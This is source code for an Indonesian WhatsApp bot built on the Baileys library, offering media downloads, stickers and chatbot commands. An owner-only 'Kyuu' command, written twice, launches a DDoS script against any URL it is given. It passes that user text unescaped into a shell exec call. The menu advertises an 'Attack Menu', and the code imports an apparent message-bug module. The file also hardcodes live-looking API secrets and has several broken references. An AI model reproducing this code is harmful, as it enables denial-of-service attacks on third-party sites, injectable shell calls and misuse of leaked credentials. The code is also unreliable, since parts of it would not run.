/**
 * Base By Siputzx
 * Created On 22/2/2024
 * Contact Me on wa.me/6288292024190
 * Supported By Gpt Assistant 

SAYA ( KyuuRzy ) TIDAK BERTANGGUNG JAWAB JIKA SCRIPT INI DI SALAH GUNAKAN 
DILARANG MENJUAL SCRIPT INI KEPADA KEPADA KRANG LAIN ( Karna Script ini Saya Akan Share Free )
JIKA ADA YANG MENJUAL NYA, SAYA PERSILAHKAN BULLY DIA + BEBAS KENON
KALAU MAU COLONG FITUR, MINIMAL MASUKIN NAMA GW DI TQTO KALIAN AJG

DAH ITU DARI GW AJA
Last Author : KyuuRzy 

NYARI SC KEK GINI?
PV TELE AJA : t.me/KyuuDev

*/
require('./config')
const { default: makeWaSocket, proto, generateWAMessageFromContent, downloadContentFromMessage, useMultiFileAuthState } = require('@whiskeysockets/baileys')
const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const { util, promisify } = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const yts = require ('yt-search');
const chalk = require('chalk')
const crypto = require('crypto')
const cheerio = require('cheerio')
const BASE_URL = 'https://aemt.me'
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { chApi } = require("./lib/noapi")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const pino = require('pino')
const { youtubedl, youtubedl2 } = require('@bochilteam/scraper-sosmed')
const { pipeline } = require('stream')
const ytdl = require('ytdl-core')
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { bytesToSize, getRandomFile, smsg, checkBandwidth, sleep, formatSize, getRandom, format, getBuffer, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, fetchJson, color, getGroupAdmins } = require("./lib/myfunc");
const { addExif } = require('./lib/exif')

module.exports = ptz = async (ptz, m, chatUpdate, store) => {
const { type, sender, pushname, isGroup } = m
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message?.buttonsResponseMessage?.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'templateButtonReplyMessage' ? m?.message?.templateButtonReplyMessage?.selectedId :
m?.mtype === 'messageContextInfo' ? (
m?.message?.buttonsResponseMessage?.selectedButtonId || 
m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId || 
m?.text
) : ''
) : '';
    
const ownerNumber = JSON.parse(fs.readFileSync('./database/owner.json')) 
    
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)[0] : '': prefa

const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await ptz.decodeJid(ptz.user.id);
const isCreator = (m && m?.sender && [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const chat = isGroup?[m.chat] : false
const mentionedJid = [m.sender]
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted?.msg || quoted);
const from = m.key.remoteJid
const isMedia = /image|video|sticker|audio/.test(mime);

const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2') 
//group
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
    
const menunya = fs.readFileSync('./lib/thumbnail/KyuuTzy.png')
const prik = fs.readFileSync('./lib/thumbnail/Ikeh.jpg')
const uploadFile = require('./lib/uploadFile')
const { sticker } = require('./lib/sticker.js')
let akira = JSON.parse(fs.readFileSync('./database/akira.json'))
let ometv = JSON.parse(fs.readFileSync('./lib/ometv.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/pendaftar.json'))
const { h2k, FileSize } = require('./lib/myfunc')
const { insertText } = require('./lib/addcase')
const { dellCase } = require('./lib/dellCase.js')
const promptt = fs.readFileSync('./lib/prompt.txt')
const { GoogleBard } = require('./lib/Bard')
const { mdelay } = require('./lib/bug/mdelay.js')
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')

const baseUrl = 'https://aemt.me/prompt/gpt';
const prompt = fs.readFileSync('./lib/prompt.txt', 'utf-8');
const query = `prompt=${prompt}&text=${text}`;
const url = `${baseUrl}?${query}`;

let laguku = []

const isUser = pendaftar.includes(m.sender)
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const acrcloud = require("acrcloud");

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🏙️'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang 🌆'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌇'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🌤️'
}
if(time2 < "10:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Subuh 🌆'
}
if(time2 < "03:00:00"){
var ucapanWaktu = 'Selamat Tengah Malam 🌃'
}

//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 if (!('ai' in chats)) chats.chatbot = true
} else global.db.data.chats[m.chat] = {
ai: false,
isBanned: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
}
} catch (err) {
}
if (!db.data.settings[botNumber].public) {
if (!isCreator) return
}
    
if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}
    
//================== [ FUNC BANCHAT ] ==================//
if ((m?.chat in global.db.data.chats || m?.sender in global.db.data.users)) {
let chat = global.db.data.chats[m?.chat]
if (chat && chat.isBanned && !isCreator) return
}

if (db.data.settings[botNumber].autoread) { ptz.readMessages([m?.key]) }

    
const acr = new acrcloud({
  host: "identify-eu-west-1.acrcloud.com",
  access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
  access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR",
});  
    
 const pickRandom = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)];
};   
    
const modStick = (from, media, m) => {
let out = getRandomFile('.webp')
try {
console.log(media)
spawn('webpmux', ['-set','exif', './database/take.exif', media, '-o', out])
.on('exit', () => {
ptz.sendMessage(from, {sticker:fs.readFileSync(out)},{quoted: m})
fs.unlinkSync(out)
fs.unlinkSync(media)
})
} catch (e) {
console.log(e)
fs.unlinkSync(media)
}
}

const fvrif = {
  key: {
fromMe: false,
participant: "0@s.whatsapp.net",
...(m.chat ? { remoteJid: `0@s.whatsapp.net` } : {}),
  },
  message: {
extendedTextMessage: {
  text: "𝘒𝘺𝘶𝘶𝘙𝘻𝘺 𝘛𝘦𝘳𝘷𝘦𝘳𝘪𝘧𝘪𝘬𝘢𝘴𝘪 𝘖𝘭𝘦𝘩 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱",
  title: `Hmm`,
  jpgThumbnail: fs.readFileSync("./lib/thumbnail/KyuuTzy.png"),
}}};

async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: m.pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl:`${KyuuKuru}`,sourceUrl: `https://wa.me/${owner}`																												
}}, sticker: nah }, { quoted: m })   				
await fs.unlinkSync(stok)
}  
    
const floc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `Hello ${pushname}`, jpegThumbnail : 'https://telegra.ph/file/81dedddbbf22909a97e07.jpg'}}}

const ryobug = {
	key: {
		remoteJid: 'status@broadcast',
		fromMe: false, 
		participant: '0@s.whatsapp.net'
	},
    message: {
        listResponseMessage: {
            title: ` Visi0n - thezetsuboxygen`
        }
    }
}


async function addExifAvatar(
  buffer,
  packname,
  author,
  categories = [""],
  extra = {},
) {
  const {
default: { Image },
  } = await import("node-webpmux");
  const img = new Image();
  const json = {
"sticker-pack-id": "Natsxe",
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
emojis: categories,
"is-avatar-sticker": 1,
...extra,
  };
  let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
  ]);
  let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
  let exif = Buffer.concat([exifAttr, jsonBuffer]);
  exif.writeUIntLE(jsonBuffer.length, 14, 4);
  await img.load(buffer);
  img.exif = exif;
  return await img.save(null);
  }
    
var randomColor = ['#232023'];
  const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];   
    
function makeid(length) {
let result = "";
const characters =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
result += characters.charAt(
Math.floor(Math.random() * charactersLength),
);
}
return result;
}
    
const getRandomSticker = (stickers) => stickers[Math.floor(Math.random() * stickers.length)];   
    
async function SayTTS(voice, text, pitch, speed) {
// limits = { minPitch: 50, maxPitch: 400, minSpeed: 50, maxSpeed: 250, defPitch: 140, defSpeed: 157 };
    try {
        pitch = parseInt(pitch);
        speed = parseInt(speed);

        const url = `https://tetyys.com/SAPI4/SAPI4?text=${encodeURIComponent(text)}&voice=${encodeURIComponent(voice)}&pitch=${pitch}&speed=${speed}`;

        if (text.length > 4088) {
            throw new Error("Text exceeds the maximum allowed length (1000 characters)");
        }

        const response = await fetch(url);
        if (!response.ok) throw new Error(`Failed to fetch audio: ${response.statusText}`);

        const buffer = await response.arrayBuffer();

        return Buffer.from(buffer);
    } catch (error) {
        throw error;
    }
}

async function VoiceLimitations(voice) {
    try {
        const url = `https://tetyys.com/SAPI4/VoiceLimitations?voice=${encodeURIComponent(voice)}`;
        
        const response = await fetch(url);
        if (!response.ok) throw new Error(`Failed to fetch voice limitations: ${response.statusText}`);

        return await response.json();
    } catch (error) {
        throw error;
    }
}
    
async function Telesticker(url) {
  return new Promise(async (resolve, reject) => {
    if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
      m.reply("Enther your url telegram sticker");
   let packName = url.replace("https://t.me/addstickers/", "");
   let data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`,
      { method: "GET", headers: { "User-Agent": "GoogleBot" } },
    );
    const hasil = [];
    for (let i = 0; i < data.data.result.stickers.length; i++) {
     let fileId = data.data.result.stickers[i].thumb.file_id;
     let data2 = await axios(
        `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`,
      );
      let result = {
        status: 200,
        author: "Xfarr05",
        url:
          "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
          data2.data.result.file_path,
      };
      hasil.push(result);
    }
    resolve(hasil);
  });
}
    
async function Quotly(obj) {
  let json;

  try {
    json = await axios.post("https://quote-api.rippanteq7.repl.co/generate", obj, {
      headers: {
        "Content-Type": "application/json"
      }
    });
  } catch (e) {
    try {
      json = await axios.post("https://quote-api-1.jigarvarma2005.repl.co/generate", obj, {
        headers: {
          "Content-Type": "application/json"
        }
      });
    } catch (e) {
      try {
        json = await axios.post("https://qc-api.rizzlogy.repl.co/generate", obj, {
          headers: {
            "Content-Type": "application/json"
          }
        });
      } catch (e) {
        try {
          json = await axios.post("https://quote-api.ghost19ui.repl.co/generate", obj, {
            headers: {
              "Content-Type": "application/json"
            }
          });
        } catch (e) {
          return e;
        }
      }
    }
  }

  const results = json.data.result.image;
  const buffer = Buffer.from(results, "base64");
  return buffer;
}

function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
    
async function replyq (text) {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./lib/jomok.js"),
fileName: 'KyuuRzy Dev',
caption: text,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./lib/thumbnail/Ikeh.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: '𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕',
body: 'In hoc maledicto mundo pax',
thumbnail: menunya,
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": prik,
sourceUrl: 'https://kyuurzy.my.id'
}}}, { quoted: fvrif});
}
    
async function newReply (teks) {
let Messagedoc = {
document: fs.readFileSync(`./lib/jomok.js`),
fileName : `vetus ligna quae mortui sunt☔`,
caption: teks,
mimetype: 'application/pdf',
headerType: 9,
contextInfo:{externalAdReply:{
title: `𝐊𝐲𝐮𝐮𝐑𝐳𝐲 𝐙͢𝐱𝐕`,
body: 'https://kyuurzy.my.id', 
showAdAttribution: true,
thumbnail: menunya,
mediaType: 4,
"MediaUrl":"KyuuRzy",
"sourceUrl":"KyuuRzy"
}}
}
ptz.sendMessage(m.chat, Messagedoc, {quoted: fvrif})
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await ptz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply2(`${err}`)
}
}

(jid, teks = '', quoted = '', opts = {}) => {return ptz.sendMessage(jid, {text: teks, contextInfo: {mentionedJid: ments(teks), externalAdReply: {showAdAttribution: opts.ads, title: opts.title ?? packname, body: opts.body, mediaType: 1, previewType: 'PHOTO', thumbnailUrl: opts.thumbUrl, thumbnail: opts.thumbnail, sourceUrl: opts.url, renderLargerThumbnail: opts.largeThumb }}}, {quoted: quoted})}

if (isCmd && m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 
}

if (isCmd && !m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 
}
    
const totalFitur = () => {
  var mytext = fs.readFileSync("./message.js").toString();
  var numUpper = (mytext.match(/case '/g) || []).length;
  return numUpper;
};

const pw = crypto.randomBytes(5).toString('hex')

async function text2img(data) {
  const response = await fetch(
    "https://api-inference.huggingface.co/models/Yntec/Ninja-Diffusers",
    {
      headers: { Authorization: "Bearer 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" },
      method: "POST",
      body: JSON.stringify(data),
    }
  );
  const result = await response.blob();
  return result;
}
    

async function ChatGpt(text) {
  try {
    const { data } = await axios(`https://onlinegpt.org/wp-json/mwai-ui/v1/chats/submit`, {
      method: "post",
      data: {
        botId: "default",
        newMessage: text,
        stream: false
      },
      headers: {
        Accept: "text/event-stream",
        "Content-Type": "application/json"
      }
    })
    return data
  } catch (err) {
    console.log(err.response.data)
    return err.response.data.message
  }
}
    
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}    

switch(command) {
//=================================================//   
case "jadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(ptz, m, from)
}
break
case "stopjadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  stopjadibot(ptz, from)
}
break
case "listjadibot":{
  if (isGroup) return m.reply("Features Used Only For Private Chat!")
  //if (!isPremium) return m.reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  listjadibot(ptz, m)
}
break
case'play3':{
if (!text) return m.reply(`🚩 Use example ${prefix}${command} naruto blue bird`)
  let res = await yts(text)
  let vid = res.videos[0]
  await ptz.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}
  })  
  if (!vid) return m.reply('Tidak di temukan, coba untuk membalikkan judul dan author nya')
  let { title, description, thumbnail, videoId, durationH, viewH, publishedTime } = vid
  const url = 'https://www.youtube.com/watch?v=' + videoId
let vap = `*〔 Y O U T U B E P L A Y 〕*

𝐓𝐢𝐭𝐥𝐞: ${title}
𝐔𝐫𝐥: ${url}
𝐃𝐞𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝗼𝐧 ${description}
𝐏𝐮𝐛𝐥𝐢𝐬𝐡𝐞𝐝: ${publishedTime}
𝐃𝐮𝐫𝐚𝐭𝐢𝗼𝐧: ${durationH}
𝐕𝐢𝐞𝐰: ${viewH}`

ptz.sendMessage(m.chat, {
text: vap,
contextInfo: {
externalAdReply: {
title: vap,
thumbnailUrl: thumbnail,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m}) 
  const yt = await youtubedl(url).catch(async () => await youtubedlv2(url))
const link = await yt.audio['128kbps'].download()
  let doc = { 
  audio: 
  { 
    url: link 
}, 
mimetype: 'audio/mp4', fileName: `${title}`, contextInfo: { externalAdReply: { showAdAttribution: true,
mediaType:  2,
mediaUrl: url,
title: title,
body: "© KyuuTzy 0.9",
sourceUrl: url,
thumbnail: await(await ptz.getFile(thumbnail)).data                                                                     
                                                                                                                 }
                       }
  }
  return ptz.sendMessage(m.chat, doc, { quoted: fvrif })
}
break
case'ai2':{
if (!text) return
ptz.sendMessage(m.chat, { text: `${ChatGpt.result}`})
}
break
case'txt2img':{
if (!text) return m.reply('! Prompt')
let blobData = await text2img(text);
let bufferData = await blobData.arrayBuffer();
ptz.sendMessage(m.chat, { image: Buffer.from(bufferData) ,caption: `*Success = Status*\n\n*Prompt* ${text}`}),{quoted:fvrif};
}
break
case 'openai': case 'chatgpt':{
let text
if (args.length >= 1) {
text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else throw `Enter questions!`
const { askGPT, GptGo } = require('./lib/gpt_bot');
const chats = await askGPT(text);    
m.reply(''+chats.result+''),{quoted:fvrif}
}
break

case "getcase":
const getCase = (cases) => {
return ("case  " + `'${cases}'` + fs
  .readFileSync("./message.js")
  .toString()
  .split("case '" + cases + "'")[1]
  .split("break")[0] +
"break"
  );
};
try {
if (!isCreator) return m.reply("lu siapa njr?");
if (!q) return m.reply(`contoh : ${prefix + command} menu`);
let nana = await getCase(q);
m.reply(nana);
} catch (err) {
console.log(err);
m.reply(`Case ${q} tidak di temukan`);
}
break;

case 'runtime':{
m.reply(`Aktif Selama *${runtime(process.uptime())}*`),{quoted:fvrif}
}
break
        
case 'totalfitur':{
let kontol = `*TOTAL FITUR SAAT INI*\n> ${totalFitur()} *Feature*\n\n*NOTE* :\n> If you want to request a feature for owners, you can directly chat privately`

ptz.sendMessage(m.chat, { caption: kontol})
}
break

case 'restart':
if (!isCreator) return m.reply("lu siapa njr?")
process.exit()
break
        
case 'listonline':
case 'liston': {
if (!m.isGroup) reply("Khusus Grup Wak")
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
ptz.sendText(m.chat, '乂 *LIST ONLINE:*\n\n' + online.map(v => '◦ @' + v.replace(/@.+/, '')).join`\n`, m, {
mentions: online
})
}
break

case'myip':{
var http = require('http')
 http.get({
 'host': 'api.ipify.org',
 'port': 80,
 'path': '/'
 }, function(resp) {
 resp.on('data', function(ip) {
 m.reply("🔎 My public IP address is: " + ip);
 })
 })}
break

case 'shortlink':{
if (!text) return m.reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) return m.reply(`*Error: Could not generate a short URL.*`);
let done = `*[ S U C C E S S P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
m.reply(done)
}
break

case 'getfunc':
if (!isCreator) return m.reply("lu siapa njr?")
if (!q) return m.reply(`Contoh penggunaan: ${prefix + command} reply`)
const getfunc = (funcc) => {
return "const "+`'${funcc}'`+fs.readFileSync('./message.js').toString().split('const \''+funcc+'\'')[1].split('')
}
m.reply(`${getfunc(q)}`)
break

case 'Kyuu': {
if (!isCreator) return
if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/DDoS/kyuu.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
        
case 'bard':{
let text
if (args.length >= 1) {
text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else throw `Enter questions!`
const { GoogleBard } = require('./lib/Bard.js');
const chatss = await GoogleBard(query); 
m.reply(''+chatss.result+'')
}
break

case 'toimage': 
 case 'toimg': {
 if (!/webp/.test(mime)) return reply(`Reply sticker dengan caption *${prefix + command}*`)
 let media = await ptz.downloadAndSaveMediaMessage(quoted)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) return err
 let buffer = fs.readFileSync(ran)
 ptz.sendMessage(m.chat, { image: buffer }, { quoted: m })
 fs.unlinkSync(ran)
 })
 
 }
 break

case 'Kyuu': {
if (!isCreator) return
if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/DDoS/kyuu.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
case 'addcase': {
 if (!isCreator) return m.reply("lu siapa njr?")
 if (!text) return m.reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                m.reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                m.reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        m.reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
        
case "delcase":{
if (!isCreator) return m.reply("lu siapa njr?")
if (!q) return m.reply("*Masukan nama case yang akan di hapus*");
dellCase("./message.js", q);
m.reply(`*Dellcase Successfully*\n\n© ${command} Download By ${botname}`);
}
break
        
case'telestick':{
  if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
    let res = await Telesticker(args[0]);
    await m.reply(`Sending ${res.length} stickers...`);
    if (m.isGroup && res.length > 30) {
      await m.reply(
        "Number of stickers more than 30, bot will send it in private chat.",
      );
      for (let i = 0; i < res.length; i++) {
      let encmedia = await ptz.sendImageAsSticker(m.sender, res[i].url, m, { packname: packname, author: author})
      await fs.unlinkSync(encmedia)
      await sleep(6000)
      }
    } else {
      for (let i = 0; i < res.length; i++) {
      let encmedia = await ptz.sendImageAsSticker(m.chat, res[i].url, m, { packname: packname, author: author });
      await fs.unlinkSync(encmedia)
      await sleep(6000)
      }
    }
  } return m.reply("Input Query / Telesticker Url");
    }
break
        
case "tagall":{
  if (!isAdmins) return m.reply("only admin group")
  if (!m.isGroup) return;
  let teks = `*👥 Tag All*
*Pesan : ${q ? q : "kosong"}*\n\n`;
  for (let mem of participants) {
teks += `ルジ @${mem.id.split("@")[0]}\n`;
  }
ptz.sendMessage(
m.chat,
{ text: teks, mentions: participants.map((a) => a.id) },
{ quoted: m },
  );
}
break;
case 'menu':{
 if (isGroup) return replyq(`Hai ${Kyuu}@${m?.sender.split('@')[0]}${Kyuu} I am an automated WhatsApp bot that can help do something, search and get data or information via WhatsApp ∆
───────────────────────
${Kyuu}</>  I N F O - B O T </>${Kyuu}
───────────────────────
  ◦ ⛩️ Bot Name : ${botname}
  ◦ ⛩️ Version : ${baileysVersion}
  ◦ ⛩️ Baileys : ${TypeBaileys}
  ◦ ⛩️ Runtime : ${runtime(process.uptime())}
───────────────────────
${Kyuu}</>  M E N U - B O T </>${Kyuu}
───────────────────────
_*Owner Menu*_
 ゲ ◦ ${prefix}upsw
 ゲ ◦ ${prefix}bot
 ゲ ◦ ${prefix}getpp
 ゲ ◦ ${prefix}getsw
 ゲ ◦ ${prefix}addcase
 ゲ ◦ ${prefix}dellcase
 ゲ ◦ ${prefix}getcase
 ゲ ◦ $
 ゲ ◦ =>
 ゲ ◦ >

_*Attack Menu*_
 ゲ ◦ ${prefix}temp-ban
